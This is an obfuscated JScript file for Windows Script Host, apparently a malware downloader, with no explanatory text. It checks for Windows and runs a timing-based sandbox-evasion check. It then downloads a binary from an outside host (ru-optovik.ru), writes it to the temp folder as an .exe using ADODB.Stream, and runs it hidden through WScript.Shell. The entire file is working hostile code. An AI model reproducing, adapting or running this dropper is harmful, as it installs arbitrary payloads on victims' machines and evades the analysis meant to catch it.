var _QA = false;
var _Z = "CreateObject";
var _DY = function _RC() {return WScript[_Z]("WScript"+".Shell");}(), _M = 11;
var _PY = "MSXML2.XMLHTTP";
var _X = 2123213;
var _MM = 0;
function _DD(_Z1){_DY["Run"](_Z1, _MM, _MM);};
function _LW(){return _PY + "";};
function _OC(_N, _XT){_MM = _MM * 1; return _N - _XT;};
function _S(){return _Z;};
/*@cc_on
  @if (@_win32 || @_win64)
    _QA = true;
  @end
@*/
if (_QA)
{
var _Y = "";
function _H(){return 22;};
var _CI = 0; var _TP = 0;
function _KJ()
{
var _TM = new this["Date"]();
var _T = _TM["getUTCMilliseconds"]();
WScript["Sleep"](_H());
var _TM = new this["Date"]();
var _Z0 = _TM["getUTCMilliseconds"]();
WScript["Sleep"](_H());
var _TM = new this["Date"]();
var _A = _TM["getUTCMilliseconds"]();
var _CI = "_QQ";
_CI = _OC(_Z0, _T);
var _TP = "_D";
_TP = _OC(_A, _Z0);
_Y = "open";
return _OC(_CI, _TP);
}
var _GR = false;
var _L = false;
for (var _ZQ = _MM; _ZQ < _H() * 1; _ZQ++){if (_KJ() != _MM){
_GR = true; 
_TP = "31" + 11 * _CI + _TP; 
_L = true; 
break;
}}
function _J() {return ((_GR == true) && (_GR == _L)) ? 1 : _MM;};
if (_GR && _J() && _L){
function _P() {return _DY["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "WYWmy4NkGbo.ex" + "e";};
 _PQ = _LW();
 _EC = WScript[_Z](_PQ);
 var _C = 1;
 while (_C){
try {
	if (_C == 1)
	{
		_EC[_Y]("GET", "http://ru-optovik.ru/j9ssl", false);
		_EC["send"]();
		_MN = "Sleep";
	}
	WScript[_MN](_H() + 120); 
	if (_EC["readystate"] < 2 * 2) continue;
	_C = _MM;
	function _V(_G) {var _S0 = (1, 2, 3, 4, 5, _G); return _S0;};
	_I = WScript[_S()]("ADODB.Stream");
	_PQ = _I;
	_PQ[_Y]();
	_PQ["type"] = _V(1);
	_PQ["write"](_EC["ResponseBody"]);
	_I["position"] = _V(_MM);
	_PQ["Save" + "ToFile"](_P(), 2);
	_I["cl"+"ose"]();
	_VC = _P();
	_DD(_VC);
} catch(_Q){};
}
}
}

